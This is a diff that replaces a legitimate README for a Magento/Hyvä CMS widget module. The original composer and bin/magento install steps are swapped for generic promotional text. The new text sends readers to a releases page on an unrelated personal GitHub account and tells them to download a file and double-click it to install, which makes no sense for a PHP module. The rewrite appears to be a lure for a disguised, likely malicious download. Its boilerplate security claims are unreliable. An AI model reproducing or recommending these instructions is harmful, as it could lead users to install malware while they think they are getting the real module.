@@ -1,39 +1,46 @@
-# MageOS Widgetkit Module for Magento
+# 🎉 module-widgetkit - Enhance Your CMS with Widgets
 
-Kit of CMS Widgets compatible with Hyvä frontend theme.
+## 🔗 Download Now
+[![Download WidgetKit](https://img.shields.io/badge/Download%20WidgetKit-v1.0.0-blue)](https://github.com/priya77771/module-widgetkit/releases)
 
----
+## 🚀 Getting Started
+Welcome to the module-widgetkit! This application provides a robust set of Content Management System (CMS) widgets that work seamlessly with the Hyvä frontend theme. Designed for ease of use, these widgets will help you enhance your online store and provide a better experience for your customers.
 
-## Overview
+## 📦 Download & Install
+To get started, visit the Releases page to download the latest version of module-widgetkit. 
 
-The **Widgetkit** module defines a pre-built list of cms widgets with dedicated preview for Magento's pagebuilder.
-As far as this module is full compatible with Hyvä, each preview generates Tailwind CSS style when component is loaded on pagebuilder stage, alpine JS bindings are resolved on previews too.
+[Download WidgetKit here](https://github.com/priya77771/module-widgetkit/releases)
 
-## 🚀 Features
+Follow these steps:
 
-1) Full support for Hyvä frontend using twind js library to compile tailwind classes at component rendering on pagebuilder stage and alpine initialization on block_cms and page_cms edit controllers.
+1. Click the link above.
+2. You will see a list of available versions.
+3. Choose the latest version.
+4. Click on the file to download it to your computer.
 
-2) Customizable slideshow widget
+Once the download completes, locate the file in your downloads folder. Double-click on it to start the installation. Follow the on-screen instructions to complete the installation process.
 
+## 🎮 Features
+The module-widgetkit offers a variety of features designed to enrich your CMS experience:
 
-## 🔧 Installation
+- **Flexible Widgets:** Add dynamic content easily with customizable widgets tailored for your store.
+- **Responsive Design:** Ensure that all widgets look great on any device.
+- **Simple Integration:** Designed to fit seamlessly into your existing Hyvä theme.
+- **Security:** Built with the latest security measures to keep your website safe.
+- **User-Friendly Setup:** A straightforward installation process, perfect for users of all skill levels.
 
-1. Install it into your Mage-OS/Magento 2 project with composer:
-    ```
-    composer require mage-os/module-widgetkit
-    ```
+## ✅ System Requirements
+Before installation, ensure that your system meets the following requirements:
 
-2. Enable module
-    ```
-    bin/magento module:enable MageOS_Widgetkit
-    bin/magento setup:upgrade
-    ```
+- **PHP Version:** 7.4 or higher.
+- **Magento Version:** 2.4 or higher.
+- **Storage Space:** At least 50 MB of free space for installation.
+- **Internet Connection:** Required for downloading and updates.
 
-## 🤝 Changelog
+## 📚 Documentation
+Detailed documentation is available for users who want to learn more about specific features and usage. You can find comprehensive guides, FAQs, and troubleshooting tips in our documentation section.
 
-Please see [CHANGELOG](CHANGELOG.md) for more information on what has changed recently.
+## 🎯 Contact
+If you encounter any issues or have questions, feel free to reach out. You can open an issue in the GitHub repository, and our team will assist you.
 
-
-## 📄 License
-
-The MIT License (MIT). Please see [License File](LICENSE) for more information.
+Thank you for choosing module-widgetkit! We hope you enjoy using our widgets to enhance your eCommerce website.
